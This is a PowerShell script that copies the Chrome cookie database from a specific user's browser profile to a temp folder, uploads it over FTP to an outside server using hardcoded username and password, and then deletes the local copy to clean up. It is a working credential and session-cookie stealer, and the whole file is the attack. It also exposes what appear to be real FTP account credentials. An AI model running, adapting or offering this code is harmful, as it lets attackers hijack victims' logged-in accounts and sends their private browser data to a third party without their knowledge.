# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Directories to work with
$source_directory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
$target_directory = "C:\temp"

# Function to upload files to the FTP server, directing files to /Cookies directory
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest to /Cookies directory
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = Get-Content -Path $file_path -Encoding Byte -ReadCount 0
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP in /Cookies."
}

# Attempt to copy the file using Robocopy
function Copy-FileWithRobocopy {
    param (
        [String]$source_directory,
        [String]$target_directory,
        [String]$file_name
    )
    $robocopyResult = robocopy $source_directory $target_directory $file_name /R:0 /W:0
    if ($robocopyResult -match "0 file\(s\) copied") {
        Write-Host "The file was not copied, it might be in use or does not exist."
        return $false
    } else {
        Write-Host "File copied successfully."
        return $true
    }
}

# Main script to check, copy, and upload the file
$file_name = [System.IO.Path]::GetFileName($source_directory)
$temp_path = Join-Path -Path $target_directory -ChildPath $file_name

if (Copy-FileWithRobocopy -source_directory $source_directory -target_directory $target_directory -file_name $file_name) {
    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
    Remove-Item -Path $temp_path -Force # Clean up the temporary file
} else {
    Write-Host "Failed to copy or upload the file."
}
